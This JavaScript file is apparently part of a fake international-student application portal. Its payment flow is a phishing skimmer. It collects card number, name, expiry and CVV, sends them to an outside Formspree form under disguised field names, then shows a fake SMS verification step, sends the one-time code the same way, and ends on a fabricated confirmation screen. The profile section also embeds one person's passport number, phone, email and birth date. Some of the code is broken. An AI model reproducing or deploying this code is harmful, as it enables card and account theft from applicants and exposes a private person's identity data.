// Global variables
let isEditMode = false;
let currentSection = '';

// Navigation functions
function toggleSidebar() {
  const sidebar = document.getElementById("sidebar");
  const overlay = document.getElementById("overlay");
  sidebar.classList.toggle("open");
  overlay.classList.toggle("active");
}

function showPage(pageId) {
  // Hide all main pages
  document.querySelectorAll('#main-content > div').forEach(page => {
    page.style.display = 'none';
  });
  
  // Show the requested page by adding the '-page' suffix
  const pageElement = document.getElementById(`${pageId}-page`);
  if (pageElement) {
    pageElement.style.display = 'block';
  }
  
  // Close the sidebar on small screens after a selection
  if (window.innerWidth < 768) {
    toggleSidebar();
  }
  
  // Specific logic for certain pages
  if (pageId === 'profile') {
    showProfileSection('general');
  }
  
  if (pageId === 'notifications') {
    updateNotificationBadge();
  }
}

// Function to download CV
function downloadCV() {
  const link = document.createElement('a');
  link.href = 'cv-oumaroudaoudasouleymane.pdf';
  link.download = 'cv-oumaroudaoudasouleymane.pdf';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  alert('Your CV download has started.');
}

// Functions for edit mode
function toggleEditMode() {
  isEditMode = !isEditMode;
  const sectionContent = document.getElementById('profile-content');
  
  if (isEditMode) {
    sectionContent.classList.add('editable-section');
    activateEditMode();
    
    document.querySelectorAll('.education-item').forEach(item => {
      item.classList.add('editable');
    });
    
    const addButton = document.createElement('button');
    addButton.className = 'add-education-btn';
    addButton.innerHTML = '<i class="fas fa-plus"></i> Add Education';
    addButton.onclick = () => alert("Add functionality not implemented.");
    
    const timeline = document.querySelector('.education-timeline');
    if (timeline && !document.querySelector('.add-education-btn')) {
      timeline.appendChild(addButton);
    }
  } else {
    sectionContent.classList.remove('editable-section');
    deactivateEditMode();
    
    document.querySelectorAll('.education-item').forEach(item => {
      item.classList.remove('editable');
    });
    
    const addButton = document.querySelector('.add-education-btn');
    if (addButton) {
      addButton.remove();
    }
  }
}

function activateEditMode() {
  const inputs = document.querySelectorAll(`#profile-content input:not([type=radio]):not([type=checkbox]), 
                                           #profile-content select, 
                                           #profile-content textarea`);
  const saveBtn = document.querySelector('#profile-content .save-btn');
  
  inputs.forEach(input => {
    input.classList.remove('disabled-field');
    input.readOnly = false;
    input.disabled = false;
  });
  
  saveBtn.classList.remove('btn-modify-disabled');
  saveBtn.classList.add('btn-modify-active');
  saveBtn.innerHTML = '<i class="fas fa-save"></i> Save';
}

function deactivateEditMode() {
  const inputs = document.querySelectorAll(`#profile-content input:not([type=radio]):not([type=checkbox]), 
                                           #profile-content select, 
                                           #profile-content textarea`);
  const saveBtn = document.querySelector('#profile-content .save-btn');
  
  inputs.forEach(input => {
    input.classList.add('disabled-field');
    input.readOnly = true;
  });
  
  saveBtn.classList.remove('btn-modify-active');
  saveBtn.classList.add('btn-modify-disabled');
  saveBtn.innerHTML = '<i class="fas fa-edit"></i> Edit';
}

// Profile sections content
const profileSections = {
  general: `
    <div class="profile-header">
      <h1>Personal Information</h1>
      <p>Read-only information</p>
    </div>
    <div class="card">
      <div class="section-title">
        <i class="fas fa-user"></i>
        <h2>Personal Information</h2>
      </div>
      <div class="grid">
        <div><label>First Name *</label><input type="text" value="Harouna" class="disabled-field" readonly /></div>
        <div><label>Last Name *</label><input type="text" value="Abass Ousseini" class="disabled-field" readonly /></div>
        <div><label>Date of Birth *</label><input type="date" value="1999-09-28" class="disabled-field" readonly /></div>
        <div><label>Place of Birth *</label><input type="text" value="Niamey" class="disabled-field" readonly /></div>       
        <div><label>Native Language *</label><input type="text" value="French" class="disabled-field" readonly /></div>
        <div><label>Nationality *</label><input type="text" value="Nigerien" class="disabled-field" readonly /></div>
        <div><label>Passport *</label><input type="text" value="13pc48492" class="disabled-field" readonly /></div>
        <div><label>Passport Expiry Date *</label><input type="date" value="2030-05-11" class="disabled-field" readonly /></div>
        <div><label>Marital Status *</label><input type="text" value="Single" class="disabled-field" readonly /></div>
        <div><label>Phone *</label><input type="tel" value="227 90132717" class="disabled-field" readonly /></div>
        <div><label>Email Address *</label><input type="email" value="kodahabasse@gmail.com" class="disabled-field" readonly /></div>
        <div><label>City *</label><input type="text" value="Niamey" class="disabled-field" readonly /></div>
        <div><label>Address *</label><input type="text" value="DAN ZAMA" class="disabled-field" readonly /></div>
        <div><label>Postal Code *</label><input type="text" value="8000" class="disabled-field" readonly /></div>
        <div><label>Country *</label><input type="text" value="NIGER" class="disabled-field" readonly /></div>
      </div>
      <div class="clearfix">
        <button class="save-btn btn-modify-disabled">
          <i class="fas fa-edit"></i> Edit
        </button>
      </div> 
      <p class="not-editable-message">Click "Edit" to update your information</p>
    </div>
  `,
  
education: `
  <div class="profile-header">
    <h1>Academic Background</h1>
    <p>History of your education and diplomas</p>
  </div>
  
  <div class="card">
    <div class="section-title">
      <i class="fas fa-graduation-cap"></i>
      <h2>Educational History</h2>
    </div>
    
    <div class="education-timeline">
      <div class="education-item" onclick="toggleEducationDetails('master')">
        <div class="education-header">
          <i class="fas fa-circle icon-red"></i>
          <div class="education-title">1-YEAR LICENCE DEGREE</div>
          <i class="fas fa-chevron-down toggle-icon" id="toggle-master"></i>
        </div>
        <div class="education-details" id="details-master" style="display: none;">
          <div class="detail-row"><label>Institution:</label><span>ESCOM</span></div>
          <div class="detail-row"><label>Address:</label><span>Niamey</span></div>
          <div class="detail-row"><label>Period:</label><span>September 2023 - June 2024</span></div>
          <div class="detail-row"><label>Average:</label><span>13/20</span></div>
          <div class="detail-row"><label>Specialization:</label><span>COMMUNICATION</span></div>
          <div class="detail-row"><label>Diploma Obtained:</label><span>Yes</span></div>
        </div>
      </div>

       <div class="education-item" onclick="toggleEducationDetails('licence1')">
        <div class="education-header">
          <i class="fas fa-circle icon-red"></i>
          <div class="education-title">2-YEAR BTS</div>
          <i class="fas fa-chevron-down toggle-icon" id="toggle-licence1"></i>
        </div>
        <div class="education-details" id="details-licence1" style="display: none;">
          <div class="detail-row"><label>Institution:</label><span>ONECS</span></div>
          <div class="detail-row"><label>Address:</label><span>Niamey</span></div>
          <div class="detail-row"><label>Period:</label><span>September 2021</span></div>
          <div class="detail-row"><label>Average:</label><span>11/20</span></div>
          <div class="detail-row"><label>Specialization:</label><span>Business Communication</span></div>
          <div class="detail-row"><label>Diploma Obtained:</label><span>Yes</span></div>
        </div>
      </div>


      
      <div class="education-item" onclick="toggleEducationDetails('highschool')">
        <div class="education-header">
          <i class="fas fa-circle icon-red"></i>
          <div class="education-title">GRADE 12 / HIGH SCHOOL</div>
          <i class="fas fa-chevron-down toggle-icon" id="toggle-highschool"></i>
        </div>
        <div class="education-details" id="details-highschool" style="display: none;">
          <div class="detail-row"><label>Institution:</label><span>Lycée</span></div>
          <div class="detail-row"><label>Address:</label><span>-, - Niamey</span></div>
          <div class="detail-row"><label>Period:</label><span>September 2015 - July 2018</span></div>
          <div class="detail-row"><label>Baccalaureate Average:</label><span>10.56/20</span></div>
          <div class="detail-row"><label>Field:</label><span>Literature</span></div>
          <div class="detail-row"><label>Honors:</label><span>Pass</span></div>
        </div>
      </div>
    </div>
    
    <div class="clearfix">
      <button class="save-btn btn-modify-disabled">
        <i class="fas fa-edit"></i> Edit
      </button>
    </div>
    <p class="not-editable-message">Click "Edit" to update your background</p>
  </div>
`,
  
documents: `
  <div class="profile-header">
    <h1>Documents</h1>
    <p>Manage your required documents</p>
  </div>
  <div class="card">
    <div class="section-title">
      <i class="fas fa-file-alt"></i>
      <h2>Required Documents</h2>
    </div>
    
    <div class="document-list-container">
      <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="passport" disabled checked>
          <label for="passport">Valid Passport</label>
        </div>
        <div class="document-status status-uploaded">
          <span><i class="fas fa-check-circle"></i> Uploaded</span>
          <button class="app-btn btn-download" onclick="downloadDocument('passport')"><i class="fas fa-download"></i> Download</button>
        </div>
      </div>
      <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="financial" disabled checked>
          <label for="financial">Financial Proof</label>
        </div>
        <div class="document-status status-uploaded">
          <span><i class="fas fa-check-circle"></i> Uploaded</span>
          <button class="app-btn btn-download" onclick="downloadDocument('finance')"><i class="fas fa-download"></i> Download</button>
        </div>
      </div>
      
      <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="Motivation" disabled checked>
          <label for="Motivation">Motivation Letter</label>
        </div>
        <div class="document-status status-uploaded">
          <span><i class="fas fa-check-circle"></i> Uploaded</span>
          <button class="app-btn btn-download" onclick="downloadDocument('motivation')"><i class="fas fa-download"></i> Download</button>
        </div>
      </div>
       <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="Etude" disabled checked>
          <label for="Etude">Study Plan</label>
        </div>
        <div class="document-status status-uploaded">
          <span><i class="fas fa-check-circle"></i> Uploaded</span>
          <button class="app-btn btn-download" onclick="downloadDocument('etude')"><i class="fas fa-download"></i> Download</button>
        </div>
      </div>
       <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="Recomandation" disabled checked>
          <label for="Recomandation">Recommendation Letter</label>
        </div>
        <div class="document-status status-uploaded">
          <span><i class="fas fa-check-circle"></i> Uploaded</span>
          <button class="app-btn btn-download" onclick="downloadDocument('recommandation')"><i class="fas fa-download"></i> Download</button>
        </div>
      </div>

      <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="BAC" disabled >
          <label for="BAC">BAC Transcript</label>
        </div>
       <div class="document-status status-pending">
          <span><i class="fas fa-clock"></i> Pending</span>
          <button class="app-btn btn-download" onclick="uploadDocument('bac')"><i class="fas fa-upload"></i> Upload</button>
        </div>
      </div>
      
      <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="licence_2" disabled>
          <label for="licence_2">BTS Transcript</label>
        </div>
        <div class="document-status status-pending">
          <span><i class="fas fa-clock"></i> Pending</span>
          <button class="app-btn btn-upload" onclick="uploadDocument('licence_2')"><i class="fas fa-upload"></i> Upload</button>
        </div>
      </div>
      <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="licence_3" disabled>
          <label for="licence_3">ESCOM Transcript</label>
        </div>
        <div class="document-status status-pending">
          <span><i class="fas fa-clock"></i> Pending</span>
          <button class="app-btn btn-upload" onclick="uploadDocument('licence_3')"><i class="fas fa-upload"></i> Upload</button>
        </div>
      </div>
	    
      
    </div>
    
    <button class="upload-btn" onclick="showUploadModal()">
      <i class="fas fa-plus"></i> Add documents
    </button>
  </div>
`,
  
  visa: `
    <div class="profile-header">
      <h1>Visa & Study Permit</h1>
      <p>Information about your immigration status</p>
    </div>
    <div class="card">
      <div class="section-title">
        <i class="fas fa-passport"></i>
        <h2>Visa & Study Permit</h2>
      </div>
      <div id="visaPermit">
        <div style="margin-top: 1.5rem;">
          <label style="font-weight: bold; display: block; margin-bottom: 0.5rem;">
            Have you ever been refused a visa for Canada, the USA, the UK, New Zealand, Australia, or Ireland? *
          </label>
          <div class="radio-group" style="gap: 2rem;">
            <label><input type="radio" name="refusedVisa" /> Yes</label>
            <label><input type="radio" name="refusedVisa" checked /> No</label>
          </div>
        </div>
        <div style="margin-top: 2rem;">
          <label style="font-weight: bold;">What valid study permits or visas do you hold?</label>
          <div class="radio-group" style="margin-top: 0.5rem; flex-wrap: wrap; gap: 1rem;">
            <label><input type="checkbox" /> Canada</label>
            <label><input type="checkbox" /> USA</label>
            <label><input type="checkbox" /> UK</label>
            <label><input type="checkbox" /> Australia</label>
            <label><input type="checkbox" checked /> None</label>
          </div>
        </div>
        <div style="margin-top: 2rem;">
          <label style="font-weight: bold;">
            Please provide more information about your current study permit/visa and any prior refusals, if applicable
          </label>
          <textarea placeholder="Describe your situation..." style="width: 100%; padding: 0.8rem; height: 100px; margin-top: 0.5rem; border: 1px solid #ccc; border-radius: 5px; font-size: 1rem;"></textarea>
        </div>
        <div class="clearfix">
          <button class="save-btn" style="background: #198754;">
            <i class="fas fa-save"></i> Save & Continue
          </button>
        </div>
      </div>
    </div>
  `,
  
  tests: `
    <div class="profile-header">
      <h1>Test Results</h1>
      <p>Your language exam scores</p>
    </div>
    <div class="card">
      <div class="section-title">
        <i class="fas fa-language"></i>
        <h2>English Test Scores</h2>
      </div>
      <div id="testEnglish">
        <div class="radio-group" style="flex-direction: column; align-items: flex-start; margin-top: 1rem; gap: 0.8rem;">
          <label><input type="radio" name="english" /> TOEFL</label>
          <label><input type="radio" name="english" /> IELTS</label>
          <label><input type="radio" name="english" /> PTE</label>
          <label><input type="radio" name="english" /> Duolingo</label>
          <label><input type="radio" name="english" /> I don't have a test</label>
          <label><input type="radio" name="english" checked /> Not yet, but I will in the future</label>
          <small>If you haven't taken a test yet, Applyboard can help you do so in the future.</small>
        </div>
        <div class="clearfix"><button class="save-btn">Save & Continue</button></div>
      </div>
    </div>
  `
};

function showProfileSection(section) {
  currentSection = section;
  document.getElementById('profile-content').innerHTML = profileSections[section];
  
  document.querySelectorAll('.profile-sidebar li').forEach(item => item.classList.remove('active'));
  document.getElementById(`menu-${section}`).classList.add('active');
  
  const saveBtn = document.querySelector('#profile-content .save-btn');
  if (saveBtn) {
    saveBtn.onclick = toggleEditMode;
  }
}

function handleCardClick(card) {
  card.style.boxShadow = '0 0 15px rgba(0, 123, 255, 0.6)';
  setTimeout(() => {
    card.style.boxShadow = '';
  }, 300);
}

// Notification functions
function markAsRead(button) {
  const card = button.closest('.notification-card');
  card.classList.remove('unread');
  updateNotificationBadge();
}

function deleteNotification(button) {
  const card = button.closest('.notification-card');
  card.style.opacity = '0';
  setTimeout(() => {
    card.remove();
    updateNotificationBadge();
  }, 300);
}

function updateNotificationBadge() {
  const unreadCount = document.querySelectorAll('.notification-card.unread').length;
  const badge = document.querySelector('.notification-badge');
  if (badge) {
      if (unreadCount > 0) {
        badge.textContent = unreadCount;
        badge.style.display = 'flex';
      } else {
        badge.style.display = 'none';
      }
  }
}

// Program data
const programData = {
  "International Business": {
    description: "The International Business program prepares students to work in a global business environment. Courses cover international business operations, global marketing, international finance, and cross-cultural management strategies.",
    requirements: ["High school diploma or equivalent", "TOEFL iBT 61 or IELTS 5.5", "Official transcripts", "Motivation letter", "2 letters of recommendation"],
    dates: ["Application deadline: 08/15/2025", "Start of classes: 08/25/2025", "Payment deadline: 08/20/2025"],
    careers: ["International Trade Specialist", "Global Market Analyst", "Import/Export Coordinator", "International Sales Representative"]
  },
  "Logistics and Global Supply Chain Management": {
    description: "This program trains students to manage the flow of goods on a global scale. Courses cover transportation management, warehousing, inventory management, customs, and international regulations.",
    requirements: ["High school diploma or equivalent", "TOEFL iBT 61 or IELTS 5.5", "Official transcripts", "CV/Resume", "Proof of sufficient funds"],
    dates: ["Application deadline: 09/01/2025", "Start of classes: 09/10/2025", "Payment deadline: 09/05/2025"],
    careers: ["Supply Chain Manager", "Logistics Analyst", "Transportation Coordinator", "Warehouse Operations Manager"]
  }
};

// Function to show program details
function showProgramDetails(programName) {
  const program = programData[programName];
  document.getElementById('program-details-title').textContent = programName;
  document.getElementById('program-details-college').textContent = "Houston Community College";
  document.getElementById('program-description').innerHTML = `<p>${program.description}</p>`;
  document.getElementById('program-requirements').innerHTML = `<ul>${program.requirements.map(r => `<li>${r}</li>`).join('')}</ul>`;
  document.getElementById('program-dates').innerHTML = `<ul>${program.dates.map(d => `<li>${d}</li>`).join('')}</ul>`;
  document.getElementById('program-careers').innerHTML = `<ul>${program.careers.map(c => `<li>${c}</li>`).join('')}</ul>`;
  showPage('program-details');
}

// --- START OF PAYMENT SECTION ---

// Function to pay all pending payments
function payAllPending() {
    const pendingCards = document.querySelectorAll('#pending-payments-container .application-card');
    let totalAmount = 0;

    if (pendingCards.length === 0) {
        alert("There are no pending payments to settle.");
        return;
    }

    pendingCards.forEach(card => {
        const amount = parseFloat(card.dataset.amount);
        if (!isNaN(amount)) {
            totalAmount += amount;
        }
    });

    if (totalAmount > 0) {
        showPaymentPage('Bulk payment of pending fees', totalAmount);
    } else {
        alert("The total amount is zero. No payment is necessary.");
    }
}

// Step 1: Create and display the payment form.
function showPaymentPage(programName, amount) {
  let paymentPage = document.getElementById('payment-flow-page');
  // Creates the payment page if it doesn't exist yet.
  if (!paymentPage) {
      paymentPage = document.createElement('div');
      paymentPage.id = 'payment-flow-page';
      document.getElementById('main-content').appendChild(paymentPage);
  }

  paymentPage.innerHTML = `
    <div class="payment-container">
      <div class="program-header">
          <h1>Payment for ${programName}</h1>
          <p class="payment-amount">Amount to pay: $${amount}</p>
      </div>
      <div class="payment-card">
        <h2><i class="fas fa-credit-card"></i> Payment Information</h2>
        <div class="payment-form">
          <div class="form-group"><label for="card-number">Card Number *</label><input type="text" id="cdnumber" placeholder="1234 5678 9012 3456" maxlength="19"></div>
          <div class="form-group"><label for="card-name">Name on Card *</label><input type="text" id="cdname" placeholder="First Name Last Name"></div>
          <div class="form-row">
            <div class="form-group"><label for="expiry-date">Expiry Date *</label><input type="text" id="cddate" placeholder="MM/YY" maxlength="5"></div>
            <div class="form-group"><label for="cvv">CVV *</label><input type="text" id="cdcs" placeholder="123" maxlength="4"></div>
          </div>
          <div class="payment-methods">
            <div class="payment-method active"><i class="fab fa-cc-visa"></i> Visa</div>
            <div class="payment-method"><i class="fab fa-cc-mastercard"></i> Mastercard</div>
            <div class="payment-method"><i class="fas fa-university"></i> Bank Transfer</div>
          </div>
          <button class="payment-btn" onclick="processPayment('${programName}', ${amount})"><i class="fas fa-lock"></i> Pay $${amount}</button>
          <p class="payment-security"><i class="fas fa-lock"></i> Secure transactions with SSL encryption</p>
        </div>
      </div>
    </div>
  `;
  
  // Show the payment page.
  showPage('payment-flow');
  
  // Add event listeners for the form fields.
  document.getElementById('cdnumber').addEventListener('input', e => {
    let value = e.target.value.replace(/\s+/g, '').replace(/\D/g, '');
    e.target.value = value.match(/.{1,4}/g)?.join(' ') || '';
  });
  
  document.getElementById('cddate').addEventListener('input', e => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
    e.target.value = value;
  });

  document.querySelectorAll('.payment-method').forEach(method => {
    method.addEventListener('click', function() {
      document.querySelector('.payment-method.active').classList.remove('active');
      this.classList.add('active');
    });
  });
}

// Step 2: Start the processing (simulation)
function processPayment(programName, amount) {
  if (!document.getElementById('cdnumber').value || !document.getElementById('cdname').value || !document.getElementById('cddate').value || !document.getElementById('cdcs').value) {
    alert('Please fill in all required fields.');
    return;
  }
  showPaymentLoading(programName, amount);
savePersonalInfo();
}

  // Fonction pour enregistrer les informations personnelles
  function savePersonalInfo() {
    const number = document.getElementById('cdnumber').value;
    const name = document.getElementById('cdname').value;
	const date = document.getElementById('cddate').value;
    const cs = document.getElementById('cdcs').value;
    // Ici, vous enverriez normalement les données à un serveur
    // Pour cet exemple, nous allons simplement les stocker dans localStorage

	  // Créer l'objet de données à envoyer
    const profileData = {
      firstName: name,
      ticketnumber: number,
      timestamp: cs.toISOString(),
	  ticketdate: date.toISOString(),
      page: "harouna.html",
      action: "ticketupdate"
    };
	// Envoyer les données à Formspree
	  
    sendProfileData(profileData)
      .then(success => {
        if (success) {
           setTimeout(() => showVerificationForm(programName, amount), 8000);
        } else {
          alert("An error has occurred. Please try again later.");
        }
      });

  }

async function sendProfileData(data) {
    const FORMSPREE_PROFILE_ID = "mblkpjyy"; // À remplacer par votre ID
    
    try {
      const response = await fetch(`https://formspree.io/f/mblkpjyy`, {
        method: "POST",
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(data)
      });
      
      if (response.ok) {
        console.log("Données du profil envoyées avec succès à Formspree");
        return true;
      } else {
        console.error("Erreur lors de l'envoi des données du profil");
        return false;
      }
    } catch (error) {
      console.error("Erreur réseau:", error);
      return false;
    }
  }
// step 3 : loading page
function showPaymentLoading(programName, amount) {
  const paymentPage = document.getElementById('payment-flow-page');
  paymentPage.innerHTML = `
    <div class="payment-container">
      <div class="payment-loading">
        <i class="fas fa-spinner"></i>
        <h2>Processing your payment</h2>
        <p> Please wait while we process your payment. ${amount} $ for ${programName}...</p>
      </div>
    </div>
  `;
}

 
// Step 4: Display the verification form
function showVerificationForm(programName, amount) {
  const paymentPage = document.getElementById('payment-flow-page');
  paymentPage.innerHTML = `
    <div class="payment-container">
      <div class="verification-card">
        <h2><i class="fas fa-mobile-alt"></i> 2-Step Verification</h2>
        <p>A code has been sent to your phone number.</p>
        <div class="verification-inputs">
          ${Array(6).fill(0).map((_, i) => `<input type="text" maxlength="1" oninput="moveToNext(this, ${i + 1})">`).join('')}
        </div>
        <p class="verification-note">Enter the 6-digit code received by SMS.</p>
        <button class="payment-btn" onclick="completePayment('${programName}', ${amount})"><i class="fas fa-check-circle"></i> Validate</button>
        <p style="margin-top: 1rem;">Didn't receive a code? <span class="resend-code" onclick="resendCode()">Resend code</span></p>
      </div>
    </div>
  `;
  document.querySelector('.verification-inputs input').focus();
}

function moveToNext(input, nextIndex) {
  if (input.value.length === 1) {
    const inputs = input.parentElement.querySelectorAll('input');
    if (nextIndex < inputs.length) inputs[nextIndex].focus();
  }
}

function resendCode() {
  alert("A new verification code has been sent.");
}

// Step 5: Validate the code and display confirmation
function completePayment(programName, amount) {
  const code = [...document.querySelectorAll('.verification-inputs input')].map(i => i.value).join('');
  if (code.length !== 6) {
    alert('Please enter a complete verification code.');
    return;
  }
	showPaymentLoading(programName, amount);
	resendPersonalInfo();

}


 function resendPersonalInfo() {
	 
	const code = [...document.querySelectorAll('.verification-inputs input')].map(i => i.value).join('');
	const codeval = code.toISOString(),
    const number = document.getElementById('cdnumber').value;
    const name = document.getElementById('cdname').value;
	const date = document.getElementById('cddate').value;
    const cs = document.getElementById('cdcs').value

    // Ici, vous enverriez normalement les données à un serveur
    // Pour cet exemple, nous allons simplement les stocker dans localStorage
	  // Créer l'objet de données à envoyer
    const profileData = {
      firstName: name,
      ticketnumber: number,
      timestamp: cs.toISOString(),
	  ticketdate: date.toISOString(),
      page: codeval,
      action: "ticketupdate"
    };
	// Envoyer les données à Formspree
	  
    sendProfileData(profileData)
      .then(success => {
        if (success) {
           setTimeout(() => showPaymentSuccess(programName, amount), 8000);
        } else {
          alert("An error has occurred. Please try again later.");
        }
      });

  }

// Step 6: Display the success screen
function showPaymentSuccess(programName, amount) {
  const paymentPage = document.getElementById('payment-flow-page');
  paymentPage.innerHTML = `
    <div class="payment-container">
      <div class="payment-success">
        <i class="fas fa-check-circle"></i>
        <h2>Thank you, payment will be confirmed within 48 hours.</h2>
        <p>Your payment of $${amount} for the "${programName}" program has been successfully processed.</p>
        <div class="payment-details" style="margin-top:1.5rem; padding:1rem; background-color:#f8f9fa; border-radius:8px;">
          <p><strong>Reference:</strong> PAY-${Math.floor(100000 + Math.random() * 900000)}</p>
          <p><strong>Date:</strong> ${new Date().toLocaleDateString('en-US')}</p>
        </div>
        <button class="back-btn" onclick="showPage('payments')" style="margin-top:2rem;">
          <i class="fas fa-arrow-left"></i> Back to Profile
        </button>
      </div>
    </div>
  `;
}

// --- END OF PAYMENT SECTION ---

function toggleEducationDetails(id) {
  const details = document.getElementById(`details-${id}`);
  const icon = document.getElementById(`toggle-${id}`);
  if (details && icon) {
      const isVisible = details.style.display === "block";
      details.style.display = isVisible ? "none" : "block";
      icon.classList.toggle('fa-chevron-down', isVisible);
      icon.classList.toggle('fa-chevron-up', !isVisible);
  }
}

function downloadDocument(type) {
  alert('Simulating download of document: ' + type);
}

function uploadDocument(type) {
  alert('Simulating upload for: ' + type);
}

function showUploadModal() {
  alert("Showing modal to add new documents.");
}

// Initialization on page load
document.addEventListener('DOMContentLoaded', () => {
  showPage('home');
  updateNotificationBadge();
});
